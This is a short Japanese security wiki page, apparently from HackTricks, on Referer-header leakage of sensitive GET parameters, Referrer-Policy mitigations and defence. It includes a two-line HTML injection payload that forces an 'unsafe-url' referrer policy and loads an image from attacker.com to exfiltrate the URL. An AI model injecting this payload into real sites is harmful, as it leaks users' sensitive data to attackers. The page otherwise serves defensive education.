{{#include ../banners/hacktricks-training.md}}

# リファラーヘッダーとポリシー

リファラーは、ブラウザが前に訪れたページを示すために使用するヘッダーです。

## 機密情報の漏洩

ウェブページ内のどこかに機密情報がGETリクエストパラメータに存在する場合、そのページが外部ソースへのリンクを含んでいるか、攻撃者がユーザーに攻撃者が制御するURLを訪問させることができる（ソーシャルエンジニアリング）場合、最新のGETリクエスト内の機密情報を抽出することができる可能性があります。

## 緩和策

ブラウザに**リファラーポリシー**を遵守させることで、機密情報が他のウェブアプリケーションに送信されるのを**回避**することができます：
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## カウンター緩和

このルールはHTMLメタタグを使用して上書きできます（攻撃者はHTMLインジェクションを悪用する必要があります）：
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 防御

GETパラメータやURLのパスに機密データを入れないでください。

{{#include ../banners/hacktricks-training.md}}
